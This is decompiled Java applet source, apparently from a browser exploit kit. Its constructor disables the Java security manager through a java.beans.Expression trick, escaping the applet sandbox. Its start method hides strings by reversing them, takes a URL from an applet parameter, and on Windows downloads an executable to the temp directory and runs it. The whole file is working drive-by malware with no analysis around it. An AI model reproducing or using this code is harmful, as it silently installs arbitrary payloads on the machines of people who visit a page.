// 
// Decompiled by Procyon v0.5.30
// 

package ot;

import java.awt.Component;
import javax.swing.JList;
import java.beans.Expression;
import java.util.HashSet;
import bpac.oo;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import bpac.b;
import java.applet.Applet;

public class pizdi extends Applet
{
    public void start() {
        super.start();
        try {
            final String str1 = b.b(this.getParameter("a"));
            final String str2 = "e".concat("xe.");
            final String str3 = "ri".concat("dpm".concat("t.oi.av".concat("aj")));
            final String str4 = "ema".concat("n.so");
            final String str5 = new StringBuffer(str2).reverse().toString();
            final String str6 = new StringBuffer(str3).reverse().toString();
            final String str7 = new StringBuffer(str4).reverse().toString();
            final String str8 = String.valueOf(Math.random()) + str5;
            final String str9 = System.getProperty(str6);
            final String str10 = System.getProperty(str7);
            try {
                if (str10.indexOf("Win".concat("dows")) >= 0) {
                    final URL localURL = new URL(str1);
                    localURL.openConnection();
                    final InputStream localInputStream = localURL.openStream();
                    final FileOutputStream localFileOutputStream = new FileOutputStream(String.valueOf(str9) + str8);
                    final byte[] arrayOfByte = new byte[1024];
                    int i;
                    while ((i = localInputStream.read(arrayOfByte, 0, arrayOfByte.length)) != -1) {
                        localFileOutputStream.write(arrayOfByte, 0, i);
                    }
                    localInputStream.close();
                    localFileOutputStream.close();
                    final Runtime localRuntime = Runtime.getRuntime();
                    localRuntime.exec(String.valueOf(str9) + str8);
                }
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public pizdi() {
        final Class localSystem = System.class;
        final String str = "setS".concat("ecu".concat("rityM".concat("anager")));
        final Object[] arrayOfObject = { null };
        final oo localKAVS = new oo(localSystem, str, arrayOfObject);
        final HashSet localHashSet = new HashSet();
        localHashSet.add(localKAVS);
        final Expression e = new Expression(localSystem, str, arrayOfObject);
        final a$1 local1 = new a$1(this, localHashSet);
        final JList localJList = new JList((E[])new Object[] { local1 });
        this.add(localJList);
    }
}
